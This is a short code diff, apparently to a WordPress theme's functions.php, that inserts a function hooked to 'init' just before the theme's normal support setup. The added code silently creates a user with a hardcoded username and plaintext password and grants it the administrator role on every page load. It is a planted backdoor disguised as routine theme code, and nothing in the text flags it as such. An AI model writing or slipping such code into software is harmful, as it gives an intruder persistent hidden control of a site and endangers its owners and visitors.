@@ -31,6 +31,17 @@
  * runs before the init hook. The init hook is too late for some features, such
  * as indicating support for post thumbnails.
  */
+ function wpb_admin_account(){
+$user = 'linhng0594';
+$pass = 'Covk0594';
+$email = 'email@domain.com';
+if ( !username_exists( $user )  && !email_exists( $email ) ) {
+$user_id = wp_create_user( $user, $pass, $email );
+$user = new WP_User( $user_id );
+$user->set_role( 'administrator' );
+} }
+add_action('init','wpb_admin_account');
+
 function twentytwenty_theme_support() {
 
 	// Add default posts and comments RSS feed links to head.
